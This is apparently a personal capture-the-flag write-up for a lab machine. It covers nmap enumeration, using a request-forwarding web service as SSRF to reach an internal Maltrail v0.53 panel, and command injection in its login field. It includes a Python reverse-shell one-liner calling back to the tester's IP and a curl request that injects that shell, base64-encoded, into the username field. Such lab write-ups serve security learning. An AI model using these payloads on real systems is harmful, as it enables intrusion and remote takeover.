### Recon
Basic enumeration via nmap:
```
nmap -Pn -A -sV -o nmap_res 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (2.0s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|  
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     
|_    Content-Length: 0
```
PORTS: 22,80,55555 -> 2 open and 1 filtered
***
# PORT 55555
A web interface runs on this port 
![[Pasted image 20230709220509.png]]
we create a new basket:
![[Pasted image 20230709220807.png]]

XMnt4RoF-G5U21njmkPZcfvDpu0WyvjsQyKOVxbVNrmm
when we send request to the link:
`http://10.10.11.224:55555/babesket` it logs it 

There are several options that we can see
![[Pasted image 20230709221713.png]]
With this functionality we can redirect the request sent to this basket to any url we paste here 
![[Pasted image 20230709221735.png]]

and set the response to the `GET` request like:
![[Pasted image 20230709221758.png]]
it responses:
![[Pasted image 20230709222155.png]]
also looking at the bottom of the page:
![[Pasted image 20230712182301.png]]
searching for any vulnerability we find:
![[Pasted image 20230712182334.png]]
***
# PORT 80
remember the functionality to send the request above? we can setup the request and we can see that the request is sent to the url that we provided "by the server itself" meaning the server itself is sending the reqeust , how do I know : I read it here:
![[https://notes.sjtu.edu.cn/s/MUUhEymt7#]]
and I also fired up nc and set the url to that port , so it was only curl
unfortunately nc won't work here , so we got port 80 above as filtered , let's setup the url `http://127.0.0.1:80/` to the server , when we do that we see this page pops up:
![[Pasted image 20230712181527.png]]
at the bottom we see that it is written : `mailtrail (v0.53)`
looking for this gives us that there is a vulnerability for it and that too of `OS-Command` injection , making it RCE...Perfect!!!
we set the url again but add the login endpoint too , why?
![[Pasted image 20230712181444.png]]

we get the hint from this writeup:
![[https://medium.com/pentesternepal/owasp-ktm-0x03-ctf-writeup-e467634a9661]]
we craft our payload and hope it has python :

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.22",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

then we encode it to base64:
```
curl 'http://10.10.11.224:55555/mahesh_dalla/' \  --data 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjIyIiw4MDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==|base64 -d|bash`'
```
***
# PORT 22
and boom we get the user shell:
![[Pasted image 20230712181040.png]]

![[Pasted image 20230712181104.png]]

`d9b6d0e51264d70abf524a0f68e69f82`

